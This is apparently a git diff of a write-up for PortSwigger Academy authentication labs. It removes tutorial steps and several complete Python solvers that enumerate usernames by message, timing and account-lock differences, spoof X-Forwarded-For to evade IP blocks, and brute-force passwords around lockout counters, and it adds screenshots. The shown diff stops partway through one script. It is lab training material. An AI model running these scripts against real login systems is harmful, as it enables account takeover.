@@ -113,28 +113,15 @@ This lab is vulnerable to username enumeration and password brute-force attacks.
 
 **Screenshots:**
 
-![]()
+![Username wordlist](images/lab-0.1-username-enumeration-different-responses/01-wordlist.png)
 
-![]()
+![Lab page](images/lab-0.1-username-enumeration-different-responses/02-lab-page.png)
 
-##### Tutorial
+![Invalid username response](images/lab-0.1-username-enumeration-different-responses/03-invalid-user.png)
 
-1. Login with your own account (`wiener:peter`) and reach the 2FA page
-2. Notice `POST /login2` uses the `verify` parameter to decide whose account is accessed
-3. Change `verify=carlos` — server generates a fresh 4-digit code for Carlos
-4. Brute-force `mfa-code` from `0000`–`9999` with `verify=carlos`
-5. A `302` response means the code is correct → open it in the browser
-6. Click **My account** → `Your username is: carlos` → lab solved
+![Burp Suite tool](images/lab-0.1-username-enumeration-different-responses/04-tool.png)
 
-**Tool:** `tools/2fa-broken-logic.py`
-
-```bash
-python3 "2fa-broken-logic.py" \
-  --url "https://<id>.web-security-academy.net/login2" \
-  --cookie "session=...; verify=carlos" \
-  --self-user wiener --self-pass peter \
-  --victim carlos
-```
+![Lab solved](images/lab-0.1-username-enumeration-different-responses/05-solved.png)
 
 ##### Reference
 
@@ -181,248 +168,7 @@ This lab is subtly vulnerable to username enumeration and password brute-force a
 
 To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.
 
-##### Tutorial
 
-1. Login page -> submit invalid username + password, capture `POST /login`
-2. Notice the subtle difference: `Invalid username or password.` (with dot) vs `Invalid username or password` (no dot)
-3. Username enumeration: try each candidate with a static password, valid username = response without the dot
-
-```python
-#!/usr/bin/env python3
-"""
-Username enumeration via subtly different responses (PortSwigger lab solver).
-
-Pattern (the "subtle difference"):
-  invalid username -> body contains "Invalid username or password."  (WITH trailing dot)
-  valid username   -> body contains "Invalid username or password"   (NO trailing dot)
-
-No hardcoded usernames or passwords: wordlists come from files
-(default usernames.txt / passwords.txt).
-
-Logic:
-  PHASE 1 - username
-    baseline = 1 request with a random invalid username.
-    valid username <=> response does NOT match --invalid-regex.
-                     (default regex: "invalid username or password\\.")
-
-  PHASE 2 - password
-    success <=> HTTP 301/302/303/307/308.
-
-Usage:
-  python3 Username-enumeration-via-subtly-different-responses.py \
-      --url https://<id>.web-security-academy.net/login \
-      --cookie "session=..." \
-      --usernames usernames.txt --passwords passwords.txt
-
-  ... --verbose
-  ... --csv attempts.csv
-  ... --phase usernames
-  ... --phase passwords --username <found-user>
-  ... --invalid-regex "invalid username or password\\."
-  ... --proxy http://127.0.0.1:8080
-"""
-from __future__ import annotations
-
-import argparse
-import csv
-import re
-import sys
-import time
-from pathlib import Path
-from urllib.parse import urlparse
-
-try:
-    import requests
-    from requests import RequestException
-except ImportError:
-    print('error: pip3 install requests', file=sys.stderr)
-    sys.exit(2)
-
-
-def load_list(path: Path) -> list[str]:
-    out, seen = [], set()
-    for line in path.read_text(encoding='utf-8', errors='replace').splitlines():
-        s = line.strip()
-        if s and s not in seen:
-            seen.add(s)
-            out.append(s)
-    return out
-
-
-def norm(t: str) -> str:
-    return re.sub(r'\s+', ' ', t or '').strip().lower()
-
-
-def main() -> int:
-    ap = argparse.ArgumentParser(
-        description='Username enumeration via subtly different responses.')
-    ap.add_argument('--url', required=True)
-    ap.add_argument('--cookie', default='')
-    ap.add_argument('--usernames', default='usernames.txt')
-    ap.add_argument('--passwords', default='passwords.txt')
-    ap.add_argument('--user-field', default='username')
-    ap.add_argument('--pass-field', default='password')
-    ap.add_argument('--static-password', default='test')
-    ap.add_argument('--user-agent', default='Mozilla/5.0 (UsernameEnumeration)')
-    ap.add_argument('--proxy', default='')
-    ap.add_argument('--delay', type=float, default=0.0)
-    ap.add_argument('--timeout', type=float, default=20.0)
-    ap.add_argument('--insecure', action='store_true')
-    ap.add_argument('--all', action='store_true')
-    ap.add_argument('--verbose', action='store_true')
-    ap.add_argument('--csv', default='')
-    ap.add_argument('--invalid-regex', default=r'invalid username or password\.',
-                    help='regex marking an INVALID username (trailing dot matters). '
-                         'A response NOT matching this = valid username.')
-    ap.add_argument('--phase', choices=['usernames', 'passwords', 'both'], default='both')
-    ap.add_argument('--username', default='')
-    args = ap.parse_args()
-
-    usernames = load_list(Path(args.usernames))
-    passwords = load_list(Path(args.passwords))
-    if not usernames or not passwords:
-        print('error: username/password wordlist is empty', file=sys.stderr)
-        return 2
-
-    s = requests.Session()
-    s.headers.update({
-        'User-Agent': args.user_agent,
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-        'Accept-Language': 'en-US,en;q=0.9',
-        'Content-Type': 'application/x-www-form-urlencoded',
-    })
-    if args.cookie:
-        s.headers['Cookie'] = args.cookie
-
-    p = urlparse(args.url)
-    vhost = f'{p.scheme}://{p.netloc}'
-    s.headers['Origin'] = vhost
-    s.headers['Referer'] = vhost + '/login'
-
-    proxies = {'http': args.proxy, 'https': args.proxy} if args.proxy else None
-    verify = not args.insecure
-    invalid_re = re.compile(args.invalid_regex, re.I)
-
-    rows: list[tuple[str, str, str, int, int, str, str]] = []
-
-    def attempt(phase: str, user: str, pwd: str):
-        try:
-            r = s.post(args.url,
-                       data={args.user_field: user, args.pass_field: pwd},
-                       timeout=args.timeout, allow_redirects=False,
-                       proxies=proxies, verify=verify)
-        except RequestException as e:
-            print(f'[!] error {phase} {user}:{pwd} -> {e}', file=sys.stderr)
-            time.sleep(1)
-            return None
-        body = r.text or ''
-        loc = r.headers.get('Location', '')
-        m = bool(invalid_re.search(norm(body)))
-        rows.append((phase, user, pwd, r.status_code, len(body), loc,
-                     'invalid' if m else 'no-dot'))
-        if args.verbose:
-            print(f'    {phase:8s} {user}:{pwd:<12s} status={r.status_code} '
-                  f'len={len(body)} invalid_match={m} {loc}', file=sys.stderr)
-        if args.delay:
-            time.sleep(args.delay)
-        return r
-
-    # ---------- baseline: random invalid username ----------
-    r0 = attempt('baseline', 'zz-not-a-real-user-zz', args.static_password)
-    if r0 is None:
-        print('[-] baseline failed (check URL/connectivity)', file=sys.stderr)
-        return 2
-    b = norm(r0.text or '')
-    print(f'[*] baseline invalid -> len={len(r0.text or "")} status={r0.status_code} '
-          f'invalid_match={bool(invalid_re.search(b))}', file=sys.stderr)
-    if not invalid_re.search(b):
-        print('[!] baseline does not match --invalid-regex; check the lab error text.',
-              file=sys.stderr)
-
-    # ---------- PHASE 1: usernames ----------
-    valid: list[str] = []
-    if args.phase in ('usernames', 'both') and not args.username:
-        print(f'[*] PHASE 1: {len(usernames)} username (static pw="{args.static_password}")',
-              file=sys.stderr)
-        for i, u in enumerate(usernames, 1):
-            r = attempt('user', u, args.static_password)
-            if r is None:
-                continue
-            if not invalid_re.search(norm(r.text or '')):
-                print(f'[+] VALID USERNAME: {u} (len={len(r.text or "")} '
-                      f'status={r.status_code})', file=sys.stderr)
-                valid.append(u)
-                if not args.all:
-                    break
-            elif i % 25 == 0:
-                print(f'[*] {i}/{len(usernames)}', file=sys.stderr)
-
-    if args.phase == 'usernames':
-        print('\nVALID USERNAMES: ' + (', '.join(valid) if valid else 'none'))
-        if args.csv:
-            with open(args.csv, 'w', newline='', encoding='utf-8') as f:
-                w = csv.writer(f)
-                w.writerow(('phase', 'user', 'pass', 'status', 'len', 'location', 'note'))
-                w.writerows(rows)
-            print(f'[*] CSV: {args.csv}', file=sys.stderr)
-        return 0 if valid else 1
-
-    # ---------- PHASE 2: passwords ----------
-    targets = [args.username] if args.username else valid
-    if not targets:
-        print('[-] no valid username; skipping phase 2', file=sys.stderr)
-        return 1
-
-    print(f'[*] PHASE 2: {len(passwords)} password for {targets}', file=sys.stderr)
-    hits: list[tuple[str, str, int, str]] = []
-    for u in targets:
-        for i, pw in enumerate(passwords, 1):
-            r = attempt('pass', u, pw)
-            if r is None:
-                continue
-            status = r.status_code
-            length = len(r.text or '')
-            loc = r.headers.get('Location', '')
-
-            if status in (301, 302, 303, 307, 308):
-                ok, why = True, 'redirect'
-            else:
-                # 200 = failed login. Do NOT use length-diff (false positives).
-                ok, why = False, f'no-redirect (len={length}, status={status})'
-
-            if ok:
-                print(f'[+] HIT {u}:{pw} status={status} len={length} {loc} ({why})',
-                      file=sys.stderr)
-                hits.append((u, pw, status, loc))
-                if not args.all:
-                    break
-            elif i % 25 == 0:
-                print(f'[*] {u}: {i}/{len(passwords)}', file=sys.stderr)
-        if hits and not args.all:
-            break
-
-    if args.csv:
-        with open(args.csv, 'w', newline='', encoding='utf-8') as f:
-            w = csv.writer(f)
-            w.writerow(('phase', 'user', 'pass', 'status', 'len', 'location', 'note'))
-            w.writerows(rows)
-        print(f'[*] CSV: {args.csv}', file=sys.stderr)
-
-    if hits:
-        for u, pw, st, loc in hits:
-            print(f'HIT {u}:{pw} ({st})')
-        return 0
-    print('[-] password not found', file=sys.stderr)
-    return 1
-
-
-if __name__ == '__main__':
-    sys.exit(main())
-```
-
-4. Password brute-force: try each candidate password for the valid username, success = HTTP 302
-5. Login with the found username + password
-6. Success finish lab
 
 ##### Reference
 
@@ -460,242 +206,7 @@ This lab is vulnerable to username enumeration using its response times. To solv
 
 To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.
 
-##### Tutorial
 
-1. Login page -> submit invalid username + password, capture `POST /login`
-2. Notice: too many failed logins -> IP blocked. Bypass with `X-Forwarded-For` spoofed per request
-3. Timing side channel: valid username + long password -> response noticeably slower
-4. Username enumeration: long password (~100 chars) + XFF spoof, valid = outlier (slowest)
-5. Password brute-force: try each candidate password, success = HTTP 302
-
-```python
-#!/usr/bin/env python3
-"""
-Username enumeration via response timing (PortSwigger lab solver).
-
-Lab logic:
-  - Too many failed logins -> your IP gets blocked. Bypass by spoofing
-    X-Forwarded-For with a different value per request.
-  - Timing side channel: if the username EXISTS, the server spends extra time
-    hashing the submitted password, so a LONG password makes the response
-    noticeably SLOWER. If the username does not exist, timing stays flat.
-
-Phases:
-  PHASE 1 (username)  long password (~100 chars) + X-Forwarded-For spoof.
-                      Measure elapsed time per username.
-                      valid username <=> elapsed time is an outlier (much slower).
-  PHASE 2 (password)  for the valid username, try each password.
-                      success <=> HTTP 301/302/303/307/308.
-
-No hardcoded usernames or passwords — wordlists come from files.
-
-Usage:
-  python3 Username-enumeration-via-response-timing.py \
-      --url https://<id>.web-security-academy.net/login \
-      --cookie "session=..." \
-      --usernames usernames.txt --passwords passwords.txt
-
-  ... --long-password 100     # length of the timing probe password
-  ... --slow-factor 1.5       # valid if slower than median * factor
-  ... --verbose               # show elapsed time per attempt
-  ... --csv timing.csv
-  ... --phase usernames
-  ... --phase passwords --username <found-user>
-  ... --proxy http://127.0.0.1:8080
-"""
-from __future__ import annotations
-
-import argparse
-import csv
-import re
-import statistics
-import sys
-import time
-from pathlib import Path
-from urllib.parse import urlparse
-
-try:
-    import requests
-    from requests import RequestException
-except ImportError:
-    print('error: pip3 install requests', file=sys.stderr)
-    sys.exit(2)
-
-
-def load_list(path: Path) -> list[str]:
-    out, seen = [], set()
-    for line in path.read_text(encoding='utf-8', errors='replace').splitlines():
-        s = line.strip()
-        if s and s not in seen:
-            seen.add(s)
-            out.append(s)
-    return out
-
-
-def main() -> int:
-    ap = argparse.ArgumentParser(
-        description='Username enumeration via response timing (XFF spoof).')
-    ap.add_argument('--url', required=True)
-    ap.add_argument('--cookie', default='')
-    ap.add_argument('--usernames', default='usernames.txt')
-    ap.add_argument('--passwords', default='passwords.txt')
-    ap.add_argument('--user-field', default='username')
-    ap.add_argument('--pass-field', default='password')
-    ap.add_argument('--long-password', type=int, default=100,
-                    help='length of the timing probe password (default 100)')
-    ap.add_argument('--xff-header', default='X-Forwarded-For',
-                    help='header used to spoof source IP (default X-Forwarded-For)')
-    ap.add_argument('--xff-start', type=int, default=1)
-    ap.add_argument('--slow-factor', type=float, default=1.5,
-                    help='valid username if elapsed > median * factor (default 1.5)')
-    ap.add_argument('--min-delay-ms', type=float, default=0.0,
-                    help='optional sleep between requests (seconds)')
-    ap.add_argument('--user-agent', default='Mozilla/5.0 (TimingEnumeration)')
-    ap.add_argument('--proxy', default='')
-    ap.add_argument('--timeout', type=float, default=30.0)
-    ap.add_argument('--insecure', action='store_true')
-    ap.add_argument('--all', action='store_true')
-    ap.add_argument('--verbose', action='store_true')
-    ap.add_argument('--csv', default='')
-    ap.add_argument('--phase', choices=['usernames', 'passwords', 'both'], default='both')
-    ap.add_argument('--username', default='')
-    args = ap.parse_args()
-
-    usernames = load_list(Path(args.usernames))
-    passwords = load_list(Path(args.passwords))
-    if not usernames or not passwords:
-        print('error: username/password wordlist is empty', file=sys.stderr)
-        return 2
-
-    s = requests.Session()
-    s.headers.update({
-        'User-Agent': args.user_agent,
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-        'Content-Type': 'application/x-www-form-urlencoded',
-    })
-    if args.cookie:
-        s.headers['Cookie'] = args.cookie
-
-    p = urlparse(args.url)
-    vhost = f'{p.scheme}://{p.netloc}'
-    s.headers['Origin'] = vhost
-    s.headers['Referer'] = vhost + '/login'
-
-    proxies = {'http': args.proxy, 'https': args.proxy} if args.proxy else None
-    verify = not args.insecure
-    probe_pw = 'A' * args.long_password
-
-    xff_counter = args.xff_start
-    rows: list[tuple[str, str, str, int, float, str]] = []
-
-    def attempt(phase: str, user: str, pwd: str):
-        nonlocal xff_counter
-        headers = {args.xff_header: str(xff_counter)}
-        xff_counter += 1
-        body = {args.user_field: user, args.pass_field: pwd}
-        t0 = time.perf_counter()
-        try:
-            r = s.post(args.url, data=body, headers=headers,
-                       timeout=args.timeout, allow_redirects=False,
-                       proxies=proxies, verify=verify)
-        except RequestException as e:
-            print(f'[!] error {phase} {user}: {e}', file=sys.stderr)
-            time.sleep(1)
-            return None
-        elapsed = time.perf_counter() - t0
-        loc = r.headers.get('Location', '')
-        rows.append((phase, user, pwd[:24], r.status_code, round(elapsed, 4), loc))
-        if args.verbose:
-            print(f'    {phase:8s} {user:<16s} status={r.status_code} '
-                  f'time={elapsed:.3f}s {loc}', file=sys.stderr)
-        if args.min_delay_ms:
-            time.sleep(args.min_delay_ms)
-        return r, elapsed
-
-    # ---------- PHASE 1: usernames (timing) ----------
-    valid: list[str] = []
-    if args.phase in ('usernames', 'both') and not args.username:
-        print(f'[*] PHASE 1: {len(usernames)} username '
-              f'(probe password len={args.long_password}, XFF spoof on)', file=sys.stderr)
-        times: list[tuple[str, float]] = []
-        for u in usernames:
-            res = attempt('user', u, probe_pw)
-            if res is None:
-                continue
-            _, elapsed = res
-            times.append((u, elapsed))
-
-        if times:
-            vals = [t for _, t in times]
-            med = statistics.median(vals)
-            thr = med * args.slow_factor
-            print(f'[*] median={med:.3f}s threshold={thr:.3f}s '
-                  f'(factor {args.slow_factor})', file=sys.stderr)
-            for u, t in times:
-                if t >= thr:
-                    print(f'[+] SLOW (candidate valid): {u} {t:.3f}s', file=sys.stderr)
-                    valid.append(u)
-            if not valid:
-                # fallback: take the single slowest if nothing crossed threshold
-                u, t = max(times, key=lambda x: x[1])
-                print(f'[!] nothing crossed the threshold; slowest candidate: '
-                      f'{u} {t:.3f}s', file=sys.stderr)
-                valid.append(u)
-
-    if args.phase == 'usernames':
-        print('\nCANDIDATE USERNAMES: ' + (', '.join(valid) if valid else 'none'))
-        if args.csv:
-            with open(args.csv, 'w', newline='', encoding='utf-8') as f:
-                w = csv.writer(f)
-                w.writerow(('phase', 'user', 'pass', 'status', 'elapsed', 'location'))
-                w.writerows(rows)
-            print(f'[*] CSV: {args.csv}', file=sys.stderr)
-        return 0 if valid else 1
-
-    # ---------- PHASE 2: passwords ----------
-    targets = [args.username] if args.username else valid
-    if not targets:
-        print('[-] no valid username; skipping phase 2', file=sys.stderr)
-        return 1
-
-    print(f'[*] PHASE 2: {len(passwords)} password for {targets}', file=sys.stderr)
-    hits: list[tuple[str, str, int]] = []
-    for u in targets:
-        for pw in passwords:
-            res = attempt('pass', u, pw)
-            if res is None:
-                continue
-            r, _ = res
-            if r.status_code in (301, 302, 303, 307, 308):
-                loc = r.headers.get('Location', '')
-                print(f'[+] HIT {u}:{pw} status={r.status_code} {loc}', file=sys.stderr)
-                hits.append((u, pw, r.status_code))
-                if not args.all:
-                    break
-        if hits and not args.all:
-            break
-
-    if args.csv:
-        with open(args.csv, 'w', newline='', encoding='utf-8') as f:
-            w = csv.writer(f)
-            w.writerow(('phase', 'user', 'pass', 'status', 'elapsed', 'location'))
-            w.writerows(rows)
-        print(f'[*] CSV: {args.csv}', file=sys.stderr)
-
-    if hits:
-        for u, pw, st in hits:
-            print(f'HIT {u}:{pw} ({st})')
-        return 0
-    print('[-] password not found', file=sys.stderr)
-    return 1
-
-
-if __name__ == '__main__':
-    sys.exit(main())
-```
-
-6. Login with the found username + password
-7. Success login with username & password
 
 ##### Reference
 
@@ -745,15 +256,6 @@ This lab is vulnerable due to a logic flaw in its password brute-force protectio
 
 >Hint: Advanced users may want to solve this lab by using a macro or the Turbo Intruder extension. However, it is possible to solve the lab without using these advanced features.
 
-##### Tutorial
-
-1. Login page -> submit wrong credentials a few times, observe the IP block after 3 failures
-2. Notice the counter resets after a successful login with your own account (`wiener:peter`)
-3. Strategy: before every guess against `carlos`, log in with `wiener` to reset the counter
-4. Keep the requests sequential (one at a time) so the order is preserved
-5. Stop on the first HTTP 302 -> that password belongs to `carlos`
-6. Log in as `carlos` and open the account page
-
 **Screenshots:**
 
 ![01-login](images/lab-0.4-broken-bruteforce-protection-ip-block/01-login.png)
@@ -764,214 +266,6 @@ This lab is vulnerable due to a logic flaw in its password brute-force protectio
 
 ![04-account](images/lab-0.4-broken-bruteforce-protection-ip-block/04-account.png)
 
-**Command:**
-
-```bash
-python3 "Broken-brute-force-protection-IP-block.py" \
-  --url "https://0a590058035fd606805c807c002400e7.web-security-academy.net/login" \
-  --cookie "session=Ka5dUFPztrlMnzFZl1mGG71OGDBp0mfG" \
-  --self-user wiener --self-pass peter \
-  --victim carlos \
-  --passwords passwords.txt \
-  --max-fails 2 --delay 0.1
-```
-
-**Tool:**
-
-```python
-#!/usr/bin/env python3
-"""
-Broken brute-force protection, IP block (PortSwigger lab solver).
-
-Lab logic:
-  - 3 failed logins in a row -> your IP is blocked for 1 minute.
-  - The failed-attempt counter resets whenever you log in successfully.
-  - So: before every guess against the victim, log in with your own account to
-    reset the counter. That keeps the counter at 1 and never trips the block.
-
-Attack:
-    for each candidate password:
-        POST /login  username=<self>  password=<self-pass>   # valid -> counter reset
-        POST /login  username=<victim> password=<guess>      # 302 = solved
-
-No hardcoded credentials: self user/pass and victim come from CLI flags.
-Wordlists come from files (default passwords.txt).
-
-Usage:
-  python3 "Broken-brute-force-protection-IP-block.py" \
-      --url https://<id>.web-security-academy.net/login \
-      --cookie "session=..." \
-      --self-user wiener --self-pass peter \
-      --victim carlos \
-      --passwords passwords.txt
-
-  ... --max-fails 2        # reset before counter reaches this (default 2)
-  ... --delay 0.2          # seconds between requests
-  ... --verbose            # show status per attempt
-  ... --csv attempts.csv
-  ... --proxy http://127.0.0.1:8080
-"""
-from __future__ import annotations
-
-import argparse
-import csv
-import re
-import sys
-import time
-from pathlib import Path
-from urllib.parse import urlparse
-
-try:
-    import requests
-    from requests import RequestException
-except ImportError:
-    print('error: pip3 install requests', file=sys.stderr)
-    sys.exit(2)
-
-BLOCK_RE = re.compile(r'too many incorrect login attempts', re.I)
-
-
-def load_list(path: Path) -> list[str]:
-    out, seen = [], set()
-    for line in path.read_text(encoding='utf-8', errors='replace').splitlines():
-        s = line.strip()
-        if s and s not in seen:
-            seen.add(s)
-            out.append(s)
-    return out
-
-
-def main() -> int:
-    ap = argparse.ArgumentParser(
-        description='Broken brute-force protection (IP block) lab solver.')
-    ap.add_argument('--url', required=True, help='https://<id>.web-security-academy.net/login')
-    ap.add_argument('--cookie', default='', help='session cookie value')
-    ap.add_argument('--self-user', required=True, help='your own username (counter reset)')
-    ap.add_argument('--self-pass', required=True, help='your own password')
-    ap.add_argument('--victim', required=True, help="victim's username")
-    ap.add_argument('--passwords', default='passwords.txt')
-    ap.add_argument('--user-field', default='username')
-    ap.add_argument('--pass-field', default='password')
-    ap.add_argument('--max-fails', type=int, default=2,
-                    help='reset the counter before this many consecutive failures (default 2)')
-    ap.add_argument('--user-agent', default='Mozilla/5.0 (BruteForceProtection)')
-    ap.add_argument('--proxy', default='')
-    ap.add_argument('--delay', type=float, default=0.0)
-    ap.add_argument('--timeout', type=float, default=20.0)
-    ap.add_argument('--insecure', action='store_true')
-    ap.add_argument('--verbose', action='store_true')
-    ap.add_argument('--csv', default='')
-    args = ap.parse_args()
-
-    passwords = load_list(Path(args.passwords))
-    if not passwords:
-        print('error: password wordlist is empty', file=sys.stderr)
-        return 2
-
-    s = requests.Session()
-    s.headers.update({
-        'User-Agent': args.user_agent,
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-        'Accept-Language': 'en-US,en;q=0.9',
-        'Content-Type': 'application/x-www-form-urlencoded',
-    })
-    if args.cookie:
-        s.headers['Cookie'] = args.cookie
-
-    p = urlparse(args.url)
-    vhost = f'{p.scheme}://{p.netloc}'
-    s.headers['Origin'] = vhost
-    s.headers['Referer'] = vhost + '/login'
-
-    proxies = {'http': args.proxy, 'https': args.proxy} if args.proxy else None
-    verify = not args.insecure
-
-    rows: list[tuple[str, str, str, int, str]] = []
-
-    def post(user: str, pwd: str):
-        try:
-            r = s.post(args.url,
-                       data={args.user_field: user, args.pass_field: pwd},
-                       timeout=args.timeout, allow_redirects=False,
-                       proxies=proxies, verify=verify)
-        except RequestException as e:
-            print(f'[!] request error ({user}) -> {e}', file=sys.stderr)
-            time.sleep(1)
-            return None
-        if args.delay:
-            time.sleep(args.delay)
-        return r
-
-    def reset_counter() -> bool:
-        """Log in with your own account to reset the failed-attempt counter."""
-        r = post(args.self_user, args.self_pass)
-        if r is None:
-            return False
-        ok = r.status_code in (301, 302, 303, 307, 308)
-        rows.append(('reset', args.self_user, args.self_pass, r.status_code,
-                     r.headers.get('Location', '')))
-        if args.verbose:
-            print(f'    reset    {args.self_user:<10s} status={r.status_code} '
-                  f'{r.headers.get("Location", "")}', file=sys.stderr)
-        return ok
-
-    # make sure we start from a clean counter
-    reset_counter()
-
-    print(f'[*] victim={args.victim} passwords={len(passwords)} '
-          f'reset_user={args.self_user}', file=sys.stderr)
-
-    fails = 0
-    hit = None
-    for i, pw in enumerate(passwords, 1):
-        r = post(args.victim, pw)
-        if r is None:
-            continue
-        body = r.text or ''
-        status = r.status_code
-        loc = r.headers.get('Location', '')
-        rows.append(('guess', args.victim, pw, status, loc))
-
-        if status in (301, 302, 303, 307, 308):
-            print(f'[+] HIT {args.victim}:{pw} status={status} {loc}', file=sys.stderr)
-            hit = pw
-            break
-
-        if BLOCK_RE.search(body):
-            print(f'[-] IP blocked at attempt {i}; waiting 60s', file=sys.stderr)
-            rows.append(('blocked', args.victim, pw, status, ''))
-            time.sleep(60)
-            reset_counter()
-            fails = 0
-            continue
-
-        fails += 1
-        if args.verbose:
-            print(f'    [{i:3d}] {pw:<14s} status={status} fails={fails}', file=sys.stderr)
-        elif i % 10 == 0:
-            print(f'[*] {i}/{len(passwords)} tried', file=sys.stderr)
-
-        if fails >= args.max_fails:
-            reset_counter()
-            fails = 0
-
-    if args.csv:
-        with open(args.csv, 'w', newline='', encoding='utf-8') as f:
-            w = csv.writer(f)
-            w.writerow(('action', 'user', 'password', 'status', 'location'))
-            w.writerows(rows)
-        print(f'[*] CSV: {args.csv}', file=sys.stderr)
-
-    if hit:
-        print(f'HIT {args.victim}:{hit}')
-        return 0
-    print('[-] password not found', file=sys.stderr)
-    return 1
-
-
-if __name__ == '__main__':
-    sys.exit(main())
-```
 ##### Reference
 
 <details>
@@ -1018,246 +312,9 @@ This lab is vulnerable to username enumeration. It uses account locking, but thi
 
 ![01-terminal-phase1](images/lab-0.5-username-enumeration-account-lock/01-terminal-phase1.png)
 
-
 ![02-terminal-result](images/lab-0.5-username-enumeration-account-lock/02-terminal-result.png)
 
 ![03-solved](images/lab-0.5-username-enumeration-account-lock/03-solved.png)
-
-##### Tutorial
-
-1. Send `POST /login` with an invalid username + password to Burp Intruder
-2. Cluster bomb: payload position on `username`, plus a Null payload position at the end (`&password=example§§`) → each username repeated 5x
-3. The username whose responses contain `You have made too many incorrect login attempts` is the valid one
-4. Wait ~1 minute for the account lock to reset
-5. Sniper attack: set the valid username, payload position on `password`, grep-extract the error message
-6. The response with **no** error message (or a 302) is the correct password → log in and open the account page
-
-
-**Command:**
-
-```python
-python3 "Username-enumeration-via-account-lock.py" \
-  --url "https://0abd00db04a6e87780aabc13002600b1.web-security-academy.net/login" \
-  --cookie "session=dspuGwXWB1NVTRIdL3EvEGSvWIfgIYcK" \
-  --usernames usernames.txt \
-  --passwords passwords.txt \
-  --repeats 5 --wait 65
-```
-
-**Tool:**
-
-```python
-#!/usr/bin/env python3
-"""
-Username enumeration via account lock (PortSwigger lab solver).
-
-Lab logic:
-  - 3 failed logins lock an account; further attempts against that account return
-    "You have made too many incorrect login attempts" while unknown usernames
-    keep returning the normal "Invalid username or password".
-  - So hammer each candidate username several times in a row (Burp calls this a
-    cluster bomb with Null payloads). The username whose responses contain the
-    lock message is the valid one.
-  - Wait for the lock to reset, then brute-force that user's password. A
-    response without any error message (or a 302) is the correct password.
-
-No hardcoded usernames, passwords or error strings — all come from files/flags.
-
-Usage:
-  python3 Username-enumeration-via-account-lock.py \
-      --url https://<id>.web-security-academy.net/login \
-      --cookie "session=..." \
-      --usernames usernames.txt --passwords passwords.txt
-
-  ... --repeats 5          # attempts per username (default 5)
-  ... --wait 65            # seconds to wait for the lock to reset (default 65)
-  ... --verbose
-  ... --csv attempts.csv
-  ... --proxy http://127.0.0.1:8080
-"""
-from __future__ import annotations
-
-import argparse
-import csv
-import re
-import sys
-import time
-from pathlib import Path
-from urllib.parse import urlparse
-
-try:
-    import requests
-    from requests import RequestException
-except ImportError:
-    print('error: pip3 install requests', file=sys.stderr)
-    sys.exit(2)
-
-
-def load_list(path: Path) -> list[str]:
-    out, seen = [], set()
-    for line in path.read_text(encoding='utf-8', errors='replace').splitlines():
-        s = line.strip()
-        if s and s not in seen:
-            seen.add(s)
-            out.append(s)
-    return out
-
-
-def norm(t: str) -> str:
-    return re.sub(r'\s+', ' ', t or '').strip().lower()
-
-
-def main() -> int:
-    ap = argparse.ArgumentParser(
-        description='Username enumeration via account lock.')
-    ap.add_argument('--url', required=True)
-    ap.add_argument('--cookie', default='')
-    ap.add_argument('--usernames', default='usernames.txt')
-    ap.add_argument('--passwords', default='passwords.txt')
-    ap.add_argument('--user-field', default='username')
-    ap.add_argument('--pass-field', default='password')
-    ap.add_argument('--fixed-password', default='example',
-                    help='password used while hammering usernames (default: example)')
-    ap.add_argument('--repeats', type=int, default=5,
-                    help='attempts per username (default 5)')
-    ap.add_argument('--wait', type=float, default=65.0,
-                    help='seconds to wait for the lock to reset (default 65)')
-    ap.add_argument('--lock-regex', default=r'too many incorrect login attempts',
-                    help='regex marking a locked account')
-    ap.add_argument('--invalid-regex', default=r'invalid username or password',
-                    help='regex marking a normal failed login')
-    ap.add_argument('--user-agent', default='Mozilla/5.0 (AccountLock)')
-    ap.add_argument('--proxy', default='')
-    ap.add_argument('--delay', type=float, default=0.0)
-    ap.add_argument('--timeout', type=float, default=20.0)
-    ap.add_argument('--insecure', action='store_true')
-    ap.add_argument('--all', action='store_true',
-                    help='do not stop at the first valid username')
-    ap.add_argument('--verbose', action='store_true')
-    ap.add_argument('--csv', default='')
-    args = ap.parse_args()
-
-    usernames = load_list(Path(args.usernames))
-    passwords = load_list(Path(args.passwords))
-    if not usernames or not passwords:
-        print('error: username/password wordlist is empty', file=sys.stderr)
-        return 2
-
-    s = requests.Session()
-    s.headers.update({
-        'User-Agent': args.user_agent,
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-        'Accept-Language': 'en-US,en;q=0.9',
-        'Content-Type': 'application/x-www-form-urlencoded',
-    })
-    if args.cookie:
-        s.headers['Cookie'] = args.cookie
-
-    p = urlparse(args.url)
-    vhost = f'{p.scheme}://{p.netloc}'
-    s.headers['Origin'] = vhost
-    s.headers['Referer'] = vhost + '/login'
-
-    proxies = {'http': args.proxy, 'https': args.proxy} if args.proxy else None
-    verify = not args.insecure
-    lock_re = re.compile(args.lock_regex, re.I)
-    invalid_re = re.compile(args.invalid_regex, re.I)
-
-    rows: list[tuple[str, str, str, int, str]] = []
-
-    def post(user: str, pwd: str):
-        try:
-            r = s.post(args.url,
-                       data={args.user_field: user, args.pass_field: pwd},
-                       timeout=args.timeout, allow_redirects=False,
-                       proxies=proxies, verify=verify)
-        except RequestException as e:
-            print(f'[!] request error ({user}) -> {e}', file=sys.stderr)
-            time.sleep(1)
-            return None
-        if args.delay:
-            time.sleep(args.delay)
-        return r
-
-    # ---------- PHASE 1: find the lockable (valid) username ----------
-    print(f'[*] PHASE 1: {len(usernames)} usernames x {args.repeats} attempts '
-          f'(fixed pw="{args.fixed_password}")', file=sys.stderr)
-    valid: list[str] = []
-    for i, u in enumerate(usernames, 1):
-        locked = False
-        for _ in range(args.repeats):
-            r = post(u, args.fixed_password)
-            if r is None:
-                continue
-            body = r.text or ''
-            rows.append(('user', u, args.fixed_password, r.status_code,
-                         'lock' if lock_re.search(norm(body)) else ''))
-            if lock_re.search(norm(body)):
-                locked = True
-                break
-        if locked:
-            print(f'[+] LOCKED (valid username): {u}', file=sys.stderr)
-            valid.append(u)
-            if not args.all:
-                break
-        elif i % 10 == 0:
-            print(f'[*] {i}/{len(usernames)}', file=sys.stderr)
-
-    if not valid:
-        print('[-] no lockable username found', file=sys.stderr)
-        if args.csv:
